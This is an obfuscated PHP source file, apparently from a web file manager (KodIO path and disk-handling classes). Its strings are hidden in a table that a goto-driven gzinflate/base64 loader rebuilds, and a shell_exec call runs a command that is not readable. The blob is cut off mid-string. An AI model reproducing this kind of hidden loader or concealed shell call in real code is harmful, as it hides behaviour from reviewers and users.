$ñ€öÊÒ[8])) { return; } $‹ğûİæê = IO::pathFather($Ã±ùõÓ); $»®õ†«ı = IO::has($Ã±ùõÓ, !0); if ($»®õ†«ı[$ñ€öÊÒ[225]] > 0 || $»®õ†«ı[$ñ€öÊÒ[226]] > 0) { return; } IO::remove($Ã±ùõÓ); self::clearEmptyFolder($‹ğûİæê); } private static function getBasePath() { $£­ùÌ„¿ =& $_SERVER[•Ùç É]; $°Á¦‰ãü = Model($£­ùÌ„¿[1299])->get($£­ùÌ„¿[1300]); if ($°Á¦‰ãü) { if (!IO::exist($°Á¦‰ãü)) { IO::mkdir($°Á¦‰ãü); } if (get_path_this($°Á¦‰ãü) == $£­ùÌ„¿[1285]) { $¼„áÇ¬° = $£­ùÌ„¿[1301] . rand_string(8); @rename($°Á¦‰ãü, get_path_father($°Á¦‰ãü) . $£­ùÌ„¿[8] . $¼„áÇ¬°); $°Á¦‰ãü = DATA_PATH . $¼„áÇ¬° . $£­ùÌ„¿[8]; file_put_contents(DATA_PATH . $£­ùÌ„¿[1235], $£­ùÌ„¿[12]); Model($£­ùÌ„¿[1299])->set($£­ùÌ„¿[1300], $°Á¦‰ãü); } return $°Á¦‰ãü; } $°Á¦‰ãü = DATA_PATH . $£­ùÌ„¿[1301] . rand_string(8) . $£­ùÌ„¿[8]; $°Á¦‰ãü = IO::mkdir($°Á¦‰ãü); $°Á¦‰ãü = rtrim($°Á¦‰ãü, $£­ùÌ„¿[8]) . $£­ùÌ„¿[8]; file_put_contents($°Á¦‰ãü . $£­ùÌ„¿[1235], $£­ùÌ„¿[12]); file_put_contents(DATA_PATH . $£­ùÌ„¿[1235], $£­ùÌ„¿[12]); Model($£­ùÌ„¿[1299])->set($£­ùÌ„¿[1300], $°Á¦‰ãü); return $°Á¦‰ãü; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\173\165\163\145\162\122\145\x63\x79\x63\154\145\175"; const KOD_USER_FAV = "\x7b\165\x73\x65\162\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\173\x75\163\145\162\106\x69\x6c\145\x54\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\x65\x72\x46\151\x6c\x65\x54\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\157\x75\x70\122\x6f\x6f\x74\123\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\162\123\x68\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\x72\123\150\x61\x72\x65\114\151\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\x72\x65\x54\157\x4d\145\175"; const KOD_SHARE_ITEM = "\173\163\150\141\162\x65\x49\x74\145\155\175"; const KOD_SHARE_LINK = "\x7b\163\150\x61\162\145\x49\x74\x65\x6d\x4c\151\x6e\x6b\175"; const KOD_SEARCH = "\173\163\x65\141\x72\x63\x68\175"; const KOD_BLOCK = "\173\142\154\157\x63\153\175"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\173\165\163\145\x72\x52\x65\156\x63\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\x64\x72\x69\x76\145\x72\x7d"; public static function typeList() { $íÛôÇ©Ú =& $_SERVER[•Ùç É]; return array($íÛôÇ©Ú[1302] => self::KOD_SOURCE, $íÛôÇ©Ú[1303] => self::KOD_USER_RECYCLE, $íÛôÇ©Ú[1304] => self::KOD_USER_FAV, $íÛôÇ©Ú[1305] => self::KOD_USER_FILE_TAG, $íÛôÇ©Ú[1306] => self::KOD_USER_FILE_TYPE, $íÛôÇ©Ú[1307] => self::KOD_GROUP_ROOT_SELF, $íÛôÇ©Ú[1308] => self::KOD_USER_SHARE, $íÛôÇ©Ú[1309] => self::KOD_USER_SHARE_LINK, $íÛôÇ©Ú[1310] => self::KOD_USER_SHARE_TO_ME, $íÛôÇ©Ú[1311] => self::KOD_SHARE_ITEM, $íÛôÇ©Ú[1312] => self::KOD_SHARE_LINK, $íÛôÇ©Ú[1313] => self::KOD_SEARCH, $íÛôÇ©Ú[1314] => self::KOD_BLOCK, $íÛôÇ©Ú[1315] => self::KOD_IO, $íÛôÇ©Ú[1316] => self::KOD_USER_RECENT, $íÛôÇ©Ú[1317] => self::KOD_USER_DRIVER); } public static function parse($Í˜¡Ü†¬) { $Òû”ÎŒñ =& $_SERVER[•Ùç É]; $Í˜¡Ü†¬ = self::clear($Í˜¡Ü†¬); $È½¯Ğ½ö = array_values(self::typeList()); preg_match($Òû”ÎŒñ[1318], $Í˜¡Ü†¬, $ŠëÀŠõô); $ƒ´½…´” = array($Òû”ÎŒñ[466] => !1, $Òû”ÎŒñ[1319] => !1, $Òû”ÎŒñ[463] => !1, $Òû”ÎŒñ[86] => $Í˜¡Ü†¬, $Òû”ÎŒñ[1220] => !1, $Òû”ÎŒñ[1219] => $Òû”ÎŒñ[12]); if (is_array($ŠëÀŠõô) && count($ŠëÀŠõô) == 5) { $óÈ¥÷µ = $Òû”ÎŒñ[1320] . $ŠëÀŠõô[2] . $Òû”ÎŒñ[373]; if (in_array($óÈ¥÷µ, $È½¯Ğ½ö)) { $ƒ´½…´”[$Òû”ÎŒñ[1220]] = $ŠëÀŠõô[1]; $ƒ´½…´”[$Òû”ÎŒñ[33]] = $óÈ¥÷µ; $ƒ´½…´”[$Òû”ÎŒñ[1321]] = substr($óÈ¥÷µ, 1, -1); $ƒ´½…´”[$Òû”ÎŒñ[445]] = $ŠëÀŠõô[3]; } $ƒ´½…´”[$Òû”ÎŒñ[1219]] = $ŠëÀŠõô[4]; } $«Ğı« = array($Òû”ÎŒñ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ƒ´½…´”[$Òû”ÎŒñ[1284]] = in_array($ƒ´½…´”[$Òû”ÎŒñ[33]], $«Ğı«); return $ƒ´½…´”; } public static function isTruePath($‘±Äßà“) { $–ÚÊ˜ú± =& $_SERVER[•Ùç É]; if (substr($‘±Äßà“, 0, 1) != $–ÚÊ˜ú±[1320]) { return !0; } if (strpos($‘±Äßà“, $–ÚÊ˜ú±[453]) === 0) { return !0; } if (strpos($‘±Äßà“, $–ÚÊ˜ú±[1288]) === 0) { return !0; } if (strpos($‘±Äßà“, $–ÚÊ˜ú±[1322]) === 0) { return !0; } if (strpos($‘±Äßà“, $–ÚÊ˜ú±[1323]) === 0) { return !0; } if (strpos($‘±Äßà“, $–ÚÊ˜ú±[1324]) === 0) { return !0; } return !1; } public static function clear($İ˜îëƒ) { $èööƒú =& $_SERVER[•Ùç É]; $İ˜îëƒ = str_replace(array($èööƒú[1129], $èööƒú[248]), $èööƒú[53], $İ˜îëƒ); $İ˜îëƒ = str_replace($èööƒú[99], $èööƒú[8], $İ˜îëƒ); $ö…ªâ²Ğ = $èööƒú[1325]; if (substr($İ˜îëƒ, 0, 3) == $èööƒú[1326]) { $İ˜îëƒ = substr($İ˜îëƒ, 3); } while (strstr($İ˜îëƒ, $ö…ªâ²Ğ)) { $İ˜îëƒ = str_replace($ö…ªâ²Ğ, $èööƒú[8], $İ˜îëƒ); } $İ˜îëƒ = preg_replace($èööƒú[1327], $èööƒú[8], $İ˜îëƒ); if ($İ˜îëƒ == $èööƒú[8]) { return $èööƒú[8]; } $İ˜îëƒ = rtrim($İ˜îëƒ, $èööƒú[8]); return $İ˜îëƒ; } public static function pathTrue($­îÕäèÕ) { $ËıšÒÃº =& $_SERVER[•Ùç É]; if (!$­îÕäèÕ) { return $ËıšÒÃº[12]; } $­îÕäèÕ = str_replace($ËıšÒÃº[563], $ËıšÒÃº[8], str_replace($ËıšÒÃº[1328], $ËıšÒÃº[8], $­îÕäèÕ)); $­îÕäèÕ = str_replace($ËıšÒÃº[563], $ËıšÒÃº[8], str_replace($ËıšÒÃº[1328], $ËıšÒÃº[8], $­îÕäèÕ)); if (!strstr($­îÕäèÕ, $ËıšÒÃº[1326])) { return $­îÕäèÕ; } $´Åñæºï = explode($ËıšÒÃº[8], $­îÕäèÕ); foreach ($´Åñæºï as $¨•£Íş => $¢ÌØ±ˆÃ) { if ($¢ÌØ±ˆÃ !== $ËıšÒÃº[1329]) { continue; } for ($ÉŠ’šã  = $¨•£Íş; $ÉŠ’šã  >= 0; $ÉŠ’šã --) { if ($´Åñæºï[$ÉŠ’šã ] === $ËıšÒÃº[10] || $´Åñæºï[$ÉŠ’šã ] === $ËıšÒÃº[1329] || $´Åñæºï[$ÉŠ’šã ] === -1) { continue; } if ($´Åñæºï[$ÉŠ’šã ] === $ËıšÒÃº[12]) { $´Åñæºï[$¨•£Íş] = -1; break; } $´Åñæºï[$¨•£Íş] = -1; $´Åñæºï[$ÉŠ’šã ] = -1; break; } } $¸±Äíóí = array(); foreach ($´Åñæºï as $¢ÌØ±ˆÃ) { if ($¢ÌØ±ˆÃ !== -1) { $¸±Äíóí[] = $¢ÌØ±ˆÃ; } } $†Ş€öŒ£ = implode($ËıšÒÃº[8], $¸±Äíóí); if (strpos($†Ş€öŒ£, $ËıšÒÃº[1330]) === 0) { $†Ş€öŒ£ = $ËıšÒÃº[1326] . substr($†Ş€öŒ£, strlen($ËıšÒÃº[1330])); } return $†Ş€öŒ£; } public static function sourceID($ğç·×éş) { $¶•‰İÕÛ =& $_SERVER[•Ùç É]; $»¤‹Ü¼ = self::parse($ğç·×éş); if ($»¤‹Ü¼[$¶•‰İÕÛ[33]] !== self::KOD_SOURCE) { show_json(LNG($¶•‰İÕÛ[1331]), !1); } return $»¤‹Ü¼[$¶•‰İÕÛ[445]]; } public static function make($–æ‚†ĞŠ) { if (!$–æ‚†ĞŠ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($–æ‚†ĞŠ)); } public static function makeShare($Ó¼´æíÍ, $Áğ–Óà½) { return self::makePath(self::KOD_SHARE_ITEM, $Ó¼´æíÍ, $Áğ–Óà½); } public static function makeFileTypePath($³¡ÒÛ»Ñ) { return self::makePath(self::KOD_USER_FILE_TYPE, $³¡ÒÛ»Ñ); } public static function makeFileTagPath($àÆıÉ¼Á) { return self::makePath(self::KOD_USER_FILE_TAG, $àÆıÉ¼Á); } public static function makePath($­¯úî÷İ, $­”Ç†¸É = '', $ŠŸÅ‘„Á = '') { $­Ëî©Ö• =& $_SERVER[•Ùç É]; $•üó¹“¢ = substr($­¯úî÷İ, 1, -1); $«ªºÛ÷¬ = $­Ëî©Ö•[1332] . $•üó¹“¢ . $­Ëî©Ö•[1333] . $­”Ç†¸É . $­Ëî©Ö•[1334]; $«ªºÛ÷¬ = $ŠŸÅ‘„Á ? $«ªºÛ÷¬ . $ŠŸÅ‘„Á . $­Ëî©Ö•[8] : $«ªºÛ÷¬; return $«ªºÛ÷¬; } public static function hashPath($îÛ¦ğ–”, $Ÿ°óºúŒ = true) { $Œ‡¯ÖÊÎ =& $_SERVER[•Ùç É]; $ÁÙĞÁû = is_array($îÛ¦ğ–”) ? $îÛ¦ğ–” : IO::info($îÛ¦ğ–”); $€ÂÊâ¸¯ = _get($ÁÙĞÁû, $Œ‡¯ÖÊÎ[1335], $Œ‡¯ÖÊÎ[12]); if (!$€ÂÊâ¸¯ && isset($ÁÙĞÁû[$Œ‡¯ÖÊÎ[221]])) { $€ÂÊâ¸¯ = trim($ÁÙĞÁû[$Œ‡¯ÖÊÎ[221]], $Œ‡¯ÖÊÎ[120]); } if (!$€ÂÊâ¸¯ && isset($ÁÙĞÁû[$Œ‡¯ÖÊÎ[183]]) && $ÁÙĞÁû[$Œ‡¯ÖÊÎ[183]]) { $ÁÙĞÁû = IO::info(KodIO::make($ÁÙĞÁû[$Œ‡¯ÖÊÎ[183]])); $€ÂÊâ¸¯ = _get($ÁÙĞÁû, $Œ‡¯ÖÊÎ[1335], $Œ‡¯ÖÊÎ[12]); } $¶¼Æ÷„ = md5($ÁÙĞÁû[$Œ‡¯ÖÊÎ[86]] . $ÁÙĞÁû[$Œ‡¯ÖÊÎ[78]] . $ÁÙĞÁû[$Œ‡¯ÖÊÎ[87]]); if (!$€ÂÊâ¸¯ && file_exists($ÁÙĞÁû[$Œ‡¯ÖÊÎ[86]])) { $€ÂÊâ¸¯ = Cache::get($¶¼Æ÷„ . $Œ‡¯ÖÊÎ[1336]); $€ÂÊâ¸¯ = !1; if (!$€ÂÊâ¸¯) { $€ÂÊâ¸¯ = IO::hashSimple($ÁÙĞÁû[$Œ‡¯ÖÊÎ[86]]); Cache::set($¶¼Æ÷„ . $Œ‡¯ÖÊÎ[1336], $€ÂÊâ¸¯, 3600 * 24 * 30); } } if ($Ÿ°óºúŒ && !$€ÂÊâ¸¯) { } return $€ÂÊâ¸¯ ? $€ÂÊâ¸¯ : $¶¼Æ÷„; } public static function hashPathSafe($Ô´×–ıµ, $»æ¯Õ¿Å = true) { $—ş‹Òµ =& $_SERVER[•Ùç É]; $Ò×¢ Ú§ = self::hashPath($Ô´×–ıµ, $»æ¯Õ¿Å); return md5($Ò×¢ Ú§ . $—ş‹Òµ[1337] . Model($—ş‹Òµ[815])->get($—ş‹Òµ[816])); } public static function initSystemPath() { $Åµ¸ëÚ =& $_SERVER[•Ùç É]; if (defined($Åµ¸ëÚ[1338])) { return; } define($Åµ¸ëÚ[1338], self::systemPath($Åµ¸ëÚ[181])); define($Åµ¸ëÚ[1339], self::systemPath($Åµ¸ëÚ[1340])); define($Åµ¸ëÚ[1341], self::systemPath($Åµ¸ëÚ[1342])); define($Åµ¸ëÚ[1343], self::systemPath($Åµ¸ëÚ[1344])); IOHistory::bindEvent(); } public static function systemPath($ÜÛµë±) { $–¯¦´» =& $_SERVER[•Ùç É]; $“à·´²­ = $–¯¦´»[1345] . ucfirst($ÜÛµë±); $Ü™¾÷«× = Model($–¯¦´»[815])->get($“à·´²­); if ($Ü™¾÷«×) { return $Ü™¾÷«×; } if ($ÜÛµë± == $–¯¦´»[181]) { $Ü™¾÷«× = self::make(Model($–¯¦´»[870])->systemRootPathAdd($–¯¦´»[576])); } else { $Ü™¾÷«× = self::systemPath($–¯¦´»[181]); $ÊéäœçÄ = self::sourceID($Ü™¾÷«×); $Ü™¾÷«× = self::make(Model($–¯¦´»[870])->mkdir($ÊéäœçÄ, $ÜÛµë±)); } Model($–¯¦´»[815])->set($“à·´²­, $Ü™¾÷«×); return $Ü™¾÷«×; } public static function systemFolder($Ëé”êˆ) { $¦ñ×Šİ = IO_PATH_SYSTEM_SOURCE . $Ëé”êˆ; $‡½ğ—ÈÉ = Cache::get($¦ñ×Šİ); if (!$‡½ğ—ÈÉ) { $Œ¾øø…€ = IO::infoFullSimple($¦ñ×Šİ); if (!$Œ¾øø…€) { $‡½ğ—ÈÉ = IO::mkdir($¦ñ×Šİ, REPEAT_SKIP); } else { $‡½ğ—ÈÉ = $Œ¾øø…€[$_SERVER[•Ùç É][86]]; } Cache::set($¦ñ×Šİ, $‡½ğ—ÈÉ, 3600 * 10); } return $‡½ğ—ÈÉ; } public static function defaultDriver() { return Model($_SERVER[•Ùç É][812])->defaultDriver(); } public static function defaultIO() { $º’ÚûùÚ =& $_SERVER[•Ùç É]; $ÍóÓµ´Û = self::defaultDriver(); return $º’ÚûùÚ[1346] . $ÍóÓµ´Û[$º’ÚûùÚ[445]] . $º’ÚûùÚ[1334]; } public static function defaultDriverInit() { static $îÌ·‹Ç = false; if ($îÌ·‹Ç) { return $îÌ·‹Ç; } $îÌ·‹Ç = IO::init(self::defaultIO()); return $îÌ·‹Ç; } public static function fileTypeList() { $¶˜ì« =& $_SERVER[•Ùç É]; $â’˜©âÚ = $GLOBALS[$¶˜ì«[6]][$¶˜ì«[1347]]; foreach ($â’˜©âÚ as $ù±îí†› => $ŒÂøÏ±Û) { $¾Š©ô— = $¶˜ì«[1348] . $ù±îí†›; $ÚØ¯ô¨õ = LNG($¾Š©ô—); if ($¾Š©ô— != $ÚØ¯ô¨õ) { $â’˜©âÚ[$ù±îí†›][$¶˜ì«[32]] = $ÚØ¯ô¨õ; } } return $â’˜©âÚ; } public static function diskList($§ùá€†ë = true) { $´ó¸ğÑÜ = $_SERVER[•Ùç É][1349]; if ($§ùá€†ë) { $–ûÎ™ò = Cache::get($´ó¸ğÑÜ); if (is_array($–ûÎ™ò)) { return $–ûÎ™ò; } } $–ûÎ™ò = self::diskListGet(); Cache::set($´ó¸ğÑÜ, $–ûÎ™ò, 60); return $–ûÎ™ò; } public static function diskListGet() { $¥Ğì®† =& $_SERVER[•Ùç É]; $şÀ–‹‡ = array(); if ($GLOBALS[$¥Ğì®†[6]][$¥Ğì®†[1350]] == $¥Ğì®†[1351]) { $Ô‚¿¡Ù = $¥Ğì®†[1352]; for ($²€¾ÆäÎ = 0; $²€¾ÆäÎ < strlen($Ô‚¿¡Ù); $²€¾ÆäÎ++) { $ÓºÍÙ¶¼ = $Ô‚¿¡Ù[$²€¾ÆäÎ] . $¥Ğì®†[1353]; if (file_exists($ÓºÍÙ¶¼)) { $şÀ–‹‡[] = $ÓºÍÙ¶¼; } } return $şÀ–‹‡; } if (!function_exists($¥Ğì®†[100])) { $şÀ–‹‡[] = $¥Ğì®†[881]; return $şÀ–‹‡; } $éÖÏºÃ© = explode($¥Ğì®†[248], shell_exec($¥Ğì®†[1354])); array_shift($éÖÏºÃ©); array_pop($éÖÏºÃ©); $‘çºÔ÷ğ = array($¥Ğì®†[1355], $¥Ğì®†[1356], $¥Ğì®†[1357], $¥Ğì®†[1358], $¥Ğì®†[1359], $¥Ğì®†[1360], $¥Ğì®†[1361], $¥Ğì®†[1362]); foreach ($éÖÏºÃ© as $È–ÔÏöÛ) { $˜û¶¤¥¼ = preg_split($¥Ğì®†[1363], $È–ÔÏöÛ); $ÓºÍÙ¶¼ = $˜û¶¤¥¼[count($˜û¶¤¥¼) - 1]; if (!strstr($˜û¶¤¥¼[0], $¥Ğì®†[1364]) || !$ÓºÍÙ¶¼) { continue; } $ŸÄ´æéÌ = rtrim($ÓºÍÙ¶¼, $¥Ğì®†[8]) . $¥Ğì®†[8]; if (in_array($ŸÄ´æéÌ, $‘çºÔ÷ğ)) { continue; } $şÀ–‹‡[] = $ŸÄ´æéÌ; } return $şÀ–‹‡; } public static function isSameDisk($ºŒ ‹‘, $ÊÖæü÷û) { $ÂÀŒÜº¬ =& $_SERVER[•Ùç É]; if ($GLOBALS[$ÂÀŒÜº¬[6]][$ÂÀŒÜº¬[1350]] == $ÂÀŒÜº¬[1351]) { return strtolower(substr($ºŒ ‹‘, 0, 1)) == strtolower(substr($ÊÖæü÷û, 0, 1)); } $åå·ñ» = self::diskList(); $Ô×ìÜÏ = !1; $ÕÉ¤°¤² = !1; sort($åå·ñ»); $åå·ñ» = array_reverse($åå·ñ»); $ºŒ ‹‘ = rtrim($ºŒ ‹‘, $ÂÀŒÜº¬[8]) . $ÂÀŒÜº¬[8]; $ÊÖæü÷û = rtrim($ÊÖæü÷û, $ÂÀŒÜº¬[8]) . $ÂÀŒÜº¬[8]; foreach ($åå·ñ» as $’ÅöÅÀ) { $¯ğó¤é÷ = strlen($’ÅöÅÀ); if (!$Ô×ìÜÏ && substr($ºŒ ‹‘, 0, $¯ğó¤é÷) == $’ÅöÅÀ) { $Ô×ìÜÏ = $’ÅöÅÀ; } if (!$ÕÉ¤°¤² && substr($ÊÖæü÷û, 0, $¯ğó¤é÷) == $’ÅöÅÀ) { $ÕÉ¤°¤² = $’ÅöÅÀ; } if ($Ô×ìÜÏ && $ÕÉ¤°¤²) { break; } } return $Ô×ìÜÏ === $ÕÉ¤°¤²; } public static function transferType($Ô¡„ÉÁÚ, $¨ˆÅŞáİ) { $ıèØàš½ =& $_SERVER[•Ùç É]; $á‹Êëˆã = self::driverType($Ô¡„ÉÁÚ); $¸Å¤¬ç = self::driverType($¨ˆÅŞáİ); if ($á‹Êëˆã[$ıèØàš½[33]] == $¸Å¤¬ç[$ıèØàš½[33]] && $á‹Êëˆã[$ıèØàš½[1365]] == $¸Å¤¬ç[$ıèØàš½[1365]]) { return $ıèØàš½[1366]; } if ($á‹Êëˆã[$ıèØàš½[33]] == $ıèØàš½[914] && $¸Å¤¬ç[$ıèØàš½[33]] == $ıèØàš½[108]) { return $ıèØàš½[1245]; } if ($á‹Êëˆã[$ıèØàš½[33]] == $ıèØàš½[108] && $¸Å¤¬ç[$ıèØàš½[33]] == $ıèØàš½[914]) { return $ıèØàš½[109]; } return $ıèØàš½[1367]; } public static function driverType($­ø¿³…±) { $…Ôõ”†¡ =& $_SERVER[•Ùç É]; $°Ò«œ‡¸ = str_replace($…Ôõ”†¡[1368], $…Ôõ”†¡[12], strtolower($­ø¿³…±->getType())); if ($°Ò«œ‡¸ == $…Ôõ”†¡[802] || $°Ò«œ‡¸ == $…Ôõ”†¡[1369] || $°Ò«œ‡¸ == $…Ôõ”†¡[1370]) { $­ø¿³…± = self::defaultDriverInit(); } else { if ($°Ò«œ‡¸ == $…Ôõ”†¡[1255] || $°Ò«œ‡¸ == $…Ôõ”†¡[1371]) { $­ø¿³…± = IO::init($­ø¿³…±->pathParse[$…Ôõ”†¡[1202]]); } } $ƒãƒİß = $­ø¿³…±->path; $°Ò«œ‡¸ = str_replace($…Ôõ”†¡[1368], $…Ôõ”†¡[12], strtolower($­ø¿³…±->getType())); if ($°Ò«œ‡¸ == $…Ôõ”†¡[108]) { return array($…Ôõ”†¡[33] => $…Ôõ”†¡[108], $…Ôõ”†¡[1365] => $…Ôõ”†¡[12], $…Ôõ”†¡[86] => $ƒãƒİß, $…Ôõ”†¡[97] => $­ø¿³…±); } return array($…Ôõ”†¡[33] => $…Ôõ”†¡[914], $…Ôõ”†¡[1365] => $­ø¿³…±->pathDriver, $…Ôõ”†¡[86] => $ƒãƒİß, $…Ôõ”†¡[97] => $­ø¿³…±); } public static function pathDriverType($¨­±«) { return $¨­±« ? self::driverType(IO::init($¨­±«)) : !1; } public static function pathDriverLocal($ä™¾‰Ú) { $øáâï¨Ğ =& $_SERVER[•Ùç É]; $Ô¶ÍÙÕê = $ä™¾‰Ú ? self::driverType(IO::init($ä™¾‰Ú)) : !1; return $Ô¶ÍÙÕê[$øáâï¨Ğ[33]] == $øáâï¨Ğ[108] ? !0 : !1; } public static function allowCover($óÒõŠÃ, $Ò—ûÎ¶é = true) { $ë’ä¼éƒ =& $_SERVER[•Ùç É]; if (is_string($óÒõŠÃ)) { $óÒõŠÃ = IO::info($óÒõŠÃ); } if (!$óÒõŠÃ || $óÒõŠÃ[$ë’ä¼éƒ[33]] == $ë’ä¼éƒ[77] || $óÒõŠÃ[$ë’ä¼éƒ[78]] <= 100) { return !1; } if (isset($óÒõŠÃ[$ë’ä¼éƒ[1372]]) || !$óÒõŠÃ[$ë’ä¼éƒ[86]]) { return !1; } if (isset($óÒõŠÃ[$ë’ä¼éƒ[218]]) && !$óÒõŠÃ[$ë’ä¼éƒ[218]]) { return !1; } static $°£û—³ = false; if (!$°£û—³ || !$Ò—ûÎ¶é) { $ú–áÛç™ = self::driverType(IO::init($óÒõŠÃ[$ë’ä¼éƒ[86]])); $É´ÁØÔª = $ú–áÛç™[$ë’ä¼éƒ[97]]; $°£û—³ = $ë’ä¼éƒ[186]; if ($ú–áÛç™[$ë’ä¼éƒ[33]] == $ë’ä¼éƒ[108]) { $°£û—³ = $ë’ä¼éƒ[1373]; } if ($ú–áÛç™[$ë’ä¼éƒ[97]] && is_array($ú–áÛç™[$ë’ä¼éƒ[97]]->config)) { $İø×ä½˜ = $ú–áÛç™[$ë’ä¼éƒ[97]]->config; if (isset($İø×ä½˜[$ë’ä¼éƒ[1374]]) && $İø×ä½˜[$ë’ä¼éƒ[1374]]) { $°£û—³ = $ë’ä¼éƒ[1373]; } } } return $°£û—³ == $ë’ä¼éƒ[1373] ? !0 : !1; } } class PathDriverBOS extends PathDriverBaseS3 { public function __construct($§¦Õø ±) { parent::__construct($§¦Õø ±); } public function getHost() { $îÌ‡½ˆã =& $_SERVER[•Ùç É]; $ÛÅšÆÑ‡ = str_rtrim(parent::getHost(), $îÌ‡½ˆã[8] . $this->bucket); $ÛÅšÆÑ‡ = explode($îÌ‡½ˆã[200], $ÛÅšÆÑ‡); return $ÛÅšÆÑ‡[0] . $îÌ‡½ˆã[200] . $this->bucket . $îÌ‡½ˆã[1375] . $ÛÅšÆÑ‡[1]; } } goto bôÕÚ£æÛŒ; bÌŞÁù›”È: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\225\331\347\240\220\311", "\x92\xe0\x92\xb5\xcf\x87"); $_SERVER[•Ùç É] = explode(strrev('|||'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\11\170\33\325\325\60\314\322\276\220\264\245\245\224\122\112\240\203\111\260\235\150\261\235\335\211\223\310\262\34\213\310\226\43\311\131\260".base64_decode('zWQkjaSxJY2sGXlLUlpo2MLSlh1C2ctSIGVLKfsbaKEFWtpSllJoG8hCoeyFvqUt3w==')."\x5d\xce\x5d\x66\x24\xc3\xfb\x3f\xff\xf7\x3c\x5f\x9e\x24\xba\xf7\xdc\x65\xee\x72\xee\xb9\xe7\x9e\x7b\xce\xb9\x4f\xde\x77\xe5\xae\xf\x4f\xdd\x74\xc0\xa6\xcf\x6e\xfa\xec\x85\xf\xff\xe1\xd1\x4b\xef"."\245\341\115\237\101\277\7\322\360\67\266\36\274\37\371\163\330\326\263\32\32\272\26\114\237\323\363\371\363\356\272\125\273\111\273\131\73\67\32\171\342\311\360\27\176\165\313\11\241"."\75\327\76\61\261\147\377\375\362\231\323\147\265\242\314\264\154\53\375\121\212\246\255\350\343\206\145\133\24\220\62\213\31\43\113\303\106\221\376\372\351\117\137\54\122\326\13\246\255".base64_decode('06iP/qjQLvK/NZI3WLraE02o8b7e3lAsAZla5fSCmYZQSStrBfh+SS9bqDVydWrJLA==')."\xe9\x45\x7\x44\x0\xd2\x9a\xad\x25\x35\xb\x6a\xea\x68\x57\x3b\x42\xbd\x91\xe8\x7a\x35\xb1\xbe\x37\x4\x39\x92\xea\x48\x45\x2f\x4f\xd0\x18\x9\xc6\x6d\xad\x6c\x27\x8c\x82\xce\x73\x8c\x95\x79\xbb".strrev(''."\r".'˜ÌQªëËíA@we`XŞ”êªàí"F‹¢pîîÑƒ‚‡´p‰‚‰è"J=Ã+CÚ').strrev('Ó¬h(ÙR‘ÈuhÃÉVŒõ¥HÓÏ’±SMx%%Øæ±¨°i§ÏCN¤iA²šÊ')."\253\364\11\16\245\1\255\142\233\106\61\105\43\241\161\273\254\11\70\152\153\12\115\264\136\204\252\342\241\110\50\230\120\160\3\225\316\130\264\133\201\111\50\150\226\255\227\225\265"."\x5d\xa1\x58\x48\xc1\x8d\x6e\xab\x27\x7d\xad\x57\x0\x5f\x7a\xd0\x50\x28\x81\x48\x44\x99\xaa\x6\x5b\x2f\x94\x58\x35\xb4\x4c\x8d\xca\xa2\xb1\x8e\x50\x4c\x69\x5f\xaf\x88\x11\x4a\x99\x85\x82\x59\xf4"."\241\132\320\114\332\122\123\103\261\30\15\170\0\275\43\141\74\151\20\211\166\166\306\103\74\6\235\133\35\101\55\231\13\370\351\210\245\63\171\133\35\325\362\25\206\246\303\364\267"."\x1e\x7e\xe0\xd7\xb4\x0\x75\x47\x8c\xa2\x51\x1\x34\x85\x2a\x4c\x93\x2f\x2b\x8\x54\x58\x6e\x9d\x41\xf4\x34\x4\xa\xa8\xbc\x9\xe5\x92\x0\x4b\xb2\x5c\x6\x5a\x98\xa3\x34\xd8\xb6\x8c\xfe\x2e\x81"."\x62\x49\x15\xa7\xe9\x65\x5b\xd5\x8b\x29\x33\x6d\x14\x61\xf9\x2e\x7\x34\xd4\xec\x5c\x47\xd9\x40\x19\x68\x3c\x63\xe6\xd3\x2c\x6c\x19\x93\xd0\xb9\x8c\x91\xd7\x7b\x2a\x5\x39\xb\x8f\xa6\x72\x46\x3e".strrev('WÙˆ'."\r".'umÖ'."\0".'ÍãC£Jr•™j^¾q±	™í|%¨JÄWœ`/„hÒr“î+f]')."\312\233\132\72\256\227\171\327\14\263\23\125\24\255\330\62\260\102\262\165\232\345\102\7\242\25\360\175\264\116\214\276\32\11\303\154\245\244\245\21\363\67\364\177\333\373\237\301\376"."\25\350\277\106\40\206\3\320\246\234\236\317\253\372\270\16\113\251\220\236\157\261\301\360\133\111\243\350\107\20\32\15\107\325\234\146\345\272\323\363\125\122\212\321\330\264\76\356\53"."\345\112\260\316\371\322\36\160\240\72\36\272\36\323\16\111\224\72\157\246\264\274\334\105\32\316\331\166\51\256\27\323\170\44\240\53\346\130\221\214\124\111\327\41\123\207\107\111\53"."\xdd\xca\x7a\xa5\xab\xd5\x68\xb5\x58\xc1\x42\x9e\x87\x58\xef\x38\xcc\xe2\x40\x7b\x9c\x4d\x67\x3a\x3\x48\xca\x36\x8a\x3a\xf8\xa0\x61\x11\x9a\x27\x16\xac\x56\x2a\xe5\x8d\x94\x66\x1b\x66\xd1\x6f\xa6".base64_decode('bN32WnZZ16DGQCqlW5Y3aBbtspn3BvJ5c8wbLRtZo9iqzAbyixLRMvdiktgKa7duiQ==')."\202\21\7\177\146\166\133\305\316\170\27\261\65\311\163\227\265\242\225\321\313\336\20\254\214\126\5\65\226\323\105\226\255\303\260\112\246\145\340\346\265\52\232\155\153\251\34\246\51"."\xa2\xfa\xb6\x4f\xc8\x6f\x14\xf3\x46\x51\xaf\xca\x1b\x1a\x2f\x19\x65\x